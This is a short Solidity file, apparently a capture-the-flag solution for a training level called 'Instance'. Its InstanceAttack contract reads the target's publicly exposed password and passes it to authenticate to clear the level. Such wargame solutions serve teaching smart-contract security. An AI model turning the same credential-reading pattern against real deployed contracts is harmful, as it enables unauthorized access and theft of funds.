// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IInstance.sol";

contract InstanceAttack {
    function attack(IInstance target) external {
        target.authenticate(target.password());

        require(target.getCleared(), "Instance: Attack failed");
    }
}
